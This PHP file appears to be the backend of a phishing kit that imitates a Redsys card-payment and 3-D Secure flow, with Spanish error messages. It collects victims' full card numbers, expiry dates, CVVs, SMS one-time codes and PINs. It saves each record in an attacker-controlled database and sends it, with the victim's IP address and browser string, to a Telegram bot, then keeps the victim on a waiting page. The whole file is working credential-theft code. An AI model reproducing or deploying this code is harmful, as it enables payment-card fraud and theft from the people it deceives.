<?php
if ($_SERVER["REQUEST_METHOD"] == 'POST') 
{
	session_start();
	include "../config.php";
	include "./functions.php";
	include "./class/UserInfo.php";
	include "./class/SendTg.php";
	include '../admintus/config/config.php';
	include '../admintus/config/db.class.php';
	include "../admintus/config/User.php";

	$ip  = UserInfo::getIP();
	$uag = UserInfo::getUag();
	$user_s = $_SESSION['time'];
	$userclass = new User();
	$db = new db(DB_HOST, DB_USER, DB_PASS, DB_NAME);
	$sendTg = new SendTg($bot_token, $chat_id);

	switch ($_POST['step']) {
		case 'card':
				$errors = array();
				$card = $_SESSION["card"] = trim(htmlspecialchars($_POST["card"]));
				$month = $_SESSION["month"] = trim(htmlspecialchars($_POST["month"]));
				$year = $_SESSION["year"] = trim(htmlspecialchars($_POST["year"]));
				$cvv = $_SESSION["cvv"] = trim(htmlspecialchars($_POST["cvv"]));
				$cardDb = $_SESSION["cardDb"] = $card."|".$month."|".$year."|".$cvv;
				$bin = binInfo($card);
				$binInfo = $bin['type']." ".$bin['brand']."<br>".$bin['country']['name']." ".$bin['bank']['name'];

				if (empty($card) || empty($month) || empty($year) || empty($cvv)) {
					$errors['datos'] = 'Todos los datos son obligatorios';
				}

				if (!preg_match('/[4-5]{1}[0-9]{15}/', $card)) {
					$errors['card'] = 'El numero de tarjeta es invalido';
				}

				if (!preg_match('/[0-9]{3}/', $cvv)) {
					$errors['cvv'] = 'El numero de tarjeta es invalido';
				}

				if ($month < 1 || $month > 12 || $year < intval(date('y')) || $year > 35) {
					$errors['date'] = 'La fecha de la tarjeta es invalida';
				}

				if (count($errors) !== 0)
				{
					$_SESSION['errors']['cc'] = $errors;
					header("location: ../redsys");
				} else {
					$_SESSION['page'] = true;
					if (isset($_SESSION['update']['card'])) {
						$SQL = $db->update($userclass->updateUser($binInfo, $cardDb, $user_s, 1, date("H:i:s")));
						unset($_SESSION['update']['card']);
					} else {
						$SQL = $db->insert($userclass->createUser($binInfo, $cardDb, $ip, $uag, $user_s, 1, date("H:i:s")));
					}
					header('location: ../wait');
					$sendTg->sendCard($_SESSION["cardDb"], $ip, $uag);
					exit(0);
				}
			break;
		case 'sms':
			$errors = array();
			$sms = $_SESSION["sms"] = trim(htmlspecialchars($_POST["sms"]));

			if (empty($sms)) {
				$errors['datos'] = 'Todos los datos son obligatorios';
			}

			if (count($errors) !== 0) {
				$_SESSION['errors'] = $errors;
				header("location: ../redsys3d");
			} else {
				$SQL = $db->update($userclass->updateOtp($sms, $user_s, 1, date("H:i:s")));
				header('location: ../wait');
				$sendTg->sendOtp($_SESSION["cardDb"], $sms, $ip, $uag);
				exit(0);
			}
		break;
		case 'pin':
			$errors = array();
			$pin = $_SESSION["pin"] = trim(htmlspecialchars($_POST["pin"]));;

			if (empty($pin)) {
				$errors['datos'] = 'Todos los datos son obligatorios';
			}

			if (count($errors) !== 0) {
				$_SESSION['errors'] = $errors;
				header("location: ../pin");
			} else {
				$SQL = $db->update($userclass->updatePin($pin, $user_s, 1, date("H:i:s")));
				header('location: ../wait');
				$sendTg->sendPin($_SESSION["cardDb"], $pin, $ip, $uag);
				exit(0);
			}
		break;

	}
}
?>
